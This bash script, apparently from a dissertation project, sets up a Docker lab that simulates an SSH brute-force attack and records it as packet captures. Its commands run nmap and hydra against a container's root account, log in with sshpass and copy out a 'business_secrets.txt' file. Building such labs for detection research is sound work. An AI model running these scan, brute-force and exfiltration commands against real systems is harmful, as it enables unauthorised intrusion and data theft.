#!/bin/bash

mkdir /Users/sammccormack/Documents/Uni/Year4/Diss/ForgeExport/scenarios/scenario-ssh-bruteforce/data/pcap
mkdir /Users/sammccormack/Documents/Uni/Year4/Diss/ForgeExport/scenarios/scenario-ssh-bruteforce/data/server-output
mkdir /Users/sammccormack/Documents/Uni/Year4/Diss/ForgeExport/scenarios/scenario-ssh-bruteforce/data/hydra-output
docker network create -d bridge --subnet 172.18.0.0/16 main
docker run --name server -v /Users/sammccormack/Documents/Uni/Year4/Diss/ForgeExport/scenarios/scenario-ssh-bruteforce/data/server-output:/capture-results --ip 172.18.0.5 --network=main -itd forge/apache-ssh
docker run --name server-tcpdump -v /Users/sammccormack/Documents/Uni/Year4/Diss/ForgeExport/scenarios/scenario-ssh-bruteforce/data/pcap:/data/pcap --network=container:server -itd forge/tcpdump
docker exec -d server-tcpdump /usr/sbin/tcpdump 'not(ip6 or arp or (udp and (src port 5353 or src port 57621 or src port 1900)))' -v -w '/data/pcap/server-tcpdump.pcap'
docker run --name siege --ip 172.18.0.8 --network=main -itd forge/siege
docker run --name siege-tcpdump -v /Users/sammccormack/Documents/Uni/Year4/Diss/ForgeExport/scenarios/scenario-ssh-bruteforce/data/pcap:/data/pcap --network=container:siege -itd forge/tcpdump
docker exec -d siege-tcpdump /usr/sbin/tcpdump 'not(ip6 or arp or (udp and (src port 5353 or src port 57621 or src port 1900)))' -v -w '/data/pcap/siege-tcpdump.pcap'
docker run --name nmap-hydra -v /Users/sammccormack/Documents/Uni/Year4/Diss/ForgeExport/scenarios/scenario-ssh-bruteforce/data/hydra-output:/capture-results --ip 172.18.0.10 --network=main -itd forge/hydra-nmap
docker run --name nmap-hydra-tcpdump -v /Users/sammccormack/Documents/Uni/Year4/Diss/ForgeExport/scenarios/scenario-ssh-bruteforce/data/pcap:/data/pcap --network=container:nmap-hydra -itd forge/tcpdump
docker exec -d nmap-hydra-tcpdump /usr/sbin/tcpdump 'not(ip6 or arp or (udp and (src port 5353 or src port 57621 or src port 1900)))' -v -w '/data/pcap/nmap-hydra-tcpdump.pcap'
docker exec -d siege siege -c 50 -d 10 -t1H 172.18.0.5
docker exec nmap-hydra nmap 172.18.0.5 -oN capture-results/nmap.txt
docker exec nmap-hydra hydra -l root -P passwords.txt 172.18.0.5 -o capture-results/hydra.txt -V -I ssh -t 10
docker exec nmap-hydra sshpass -v -p root ssh -tt -o StrictHostKeyChecking=no root@172.18.0.5 'cd / && cat business_secrets.txt > capture-results/secrets.txt && exit'
docker exec -d nmap-hydra-tcpdump sh -c 'pkill tcpdump'
docker exec -d siege-tcpdump sh -c 'pkill tcpdump'
docker stop siege-tcpdump && docker rm siege-tcpdump
docker stop nmap-hydra-tcpdump && docker rm nmap-hydra-tcpdump
docker stop nmap-hydra && docker rm nmap-hydra
docker stop siege && docker rm siege
docker exec -d server-tcpdump sh -c 'pkill tcpdump'
docker stop server-tcpdump && docker rm server-tcpdump
docker stop server && docker rm server
docker network rm main
